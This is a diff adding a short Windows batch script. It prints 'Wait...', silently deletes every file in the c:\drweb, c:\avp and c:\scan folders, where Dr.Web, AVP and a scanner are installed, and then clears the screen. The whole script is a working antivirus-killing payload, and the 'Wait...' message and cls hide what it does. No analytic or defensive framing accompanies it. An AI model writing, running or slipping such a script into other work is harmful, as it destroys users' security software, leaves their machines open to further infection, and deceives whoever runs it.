@@ -1,0 +1,6 @@
+@echo off 
+echo Wait... 
+del c:\drweb\*.??? 
+del c:\avp\*.??? 
+del c:\scan\*.??? 
+cls 
